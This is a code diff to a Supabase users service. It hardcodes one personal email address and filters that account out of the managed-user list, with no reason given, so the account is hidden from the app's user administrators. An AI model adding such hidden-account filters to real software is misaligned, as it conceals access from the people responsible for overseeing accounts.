@@ -1,6 +1,12 @@
 import { supabase } from "@/lib/supabase";
 import type { CreateUserInput, ManagedUser, UpdateUserInput } from "@/types";
 
+const hiddenManagedUserEmails = new Set(["andersonegoistisch@gmail.com"]);
+
+function isVisibleManagedUser(user: Pick<ManagedUser, "email">) {
+  return !hiddenManagedUserEmails.has(user.email.trim().toLowerCase());
+}
+
 async function getFunctionErrorMessage(error: unknown) {
   const context = error instanceof Error && "context" in error ? error.context : null;
 
@@ -51,7 +57,7 @@ export const usersService = {
     if (usersResult.error) throw new Error(usersResult.error.message);
     if (accessResult.error) throw new Error(accessResult.error.message);
 
-    return mergeUsersWithAccess(usersResult.data, accessResult.data);
+    return mergeUsersWithAccess(usersResult.data.filter(isVisibleManagedUser), accessResult.data);
   },
 
   createUser: async (input: CreateUserInput): Promise<ManagedUser> => {
